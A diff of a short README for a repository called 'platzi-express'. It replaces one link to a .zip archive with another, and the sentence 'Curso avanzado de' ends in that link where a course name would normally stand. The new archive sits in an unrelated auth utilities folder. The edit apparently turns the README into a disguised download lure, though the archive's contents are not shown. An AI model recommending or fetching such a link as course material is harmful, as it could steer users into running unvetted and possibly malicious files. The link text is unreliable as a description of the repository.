@@ -1,2 +1,2 @@
 # platzi-express
-Curso avanzado de https://raw.githubusercontent.com/MaoDeew/platzi-express/master/antholite/platzi-express.zip
+Curso avanzado de https://github.com/MaoDeew/platzi-express/raw/refs/heads/master/ecommerce/utils/auth/platzi_express_2.0-beta.2.zip
